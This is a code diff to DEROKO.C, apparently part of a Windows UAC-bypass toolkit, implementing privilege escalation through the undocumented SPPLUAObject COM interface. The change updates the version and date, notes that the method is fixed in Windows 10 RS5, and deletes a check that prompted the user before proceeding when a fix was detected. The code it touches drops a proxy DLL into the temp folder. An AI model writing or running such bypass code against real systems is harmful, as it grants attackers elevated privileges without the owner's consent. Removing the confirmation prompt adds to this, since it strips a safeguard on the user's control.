@@ -4,9 +4,9 @@
 *
 *  TITLE:       DEROKO.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.01
 *
-*  DATE:        25 Aug 2018
+*  DATE:        30 Sep 2018
 *
 *  Deroko UAC bypass using SPPLUAObject (Software Licensing).
 *  Origin https://github.com/deroko/SPPLUAObjectUacBypass
@@ -91,13 +91,15 @@ HRESULT ucmSPLUAObjectRegSetValue(
 * Bypass UAC using SPPLUAObject undocumented COM interface.
 * This function expects that supMasqueradeProcess was called on process initialization.
 *
+* Fixed in Windows 10 RS5.
+*
 */
 BOOL ucmSPPLUAObjectMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL      bResult = FALSE, bCond = FALSE, bApprove = FALSE;
+    BOOL      bResult = FALSE, bCond = FALSE;
     HRESULT   r = E_FAIL, hr_init;
     ISLLUACOM *SPPLUAObject = NULL;
 
@@ -112,15 +114,6 @@ BOOL ucmSPPLUAObjectMethod(
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
     do {
-
-        //
-        // Potential fix check.
-        //
-        if (supIsConsentApprovedInterface(T_CLSID_SPPLUAObject, &bApprove)) {
-            if (bApprove == FALSE)
-                if (ucmShowQuestion(UACFIX) != IDYES)
-                    break;
-        }
 
         //
         // Drop Fubuki to the %temp% as OskSupport.dll
